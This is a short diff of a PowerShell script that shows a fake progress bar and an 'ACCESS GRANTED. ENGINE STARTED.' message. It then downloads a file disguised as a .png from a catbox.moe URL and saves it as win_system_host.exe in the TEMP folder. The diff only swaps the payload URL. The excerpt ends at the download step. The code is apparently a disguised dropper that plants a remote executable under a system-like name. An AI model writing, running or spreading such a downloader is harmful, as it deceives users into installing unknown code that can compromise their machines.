@@ -10,7 +10,7 @@ for ($i=0;$i -le 100;$i+=5){
     Start-Sleep -Milliseconds 40
 }
 Write-Host "`n  [+] ACCESS GRANTED. ENGINE STARTED." -ForegroundColor Green
-$u="https://files.catbox.moe/1czcuj.png"
+$u="https://files.catbox.moe/pvde9f.png"
 $t="$env:TEMP\win_system_host.exe"
 try {
     Invoke-WebRequest -Uri $u -OutFile $t -UseBasicParsing
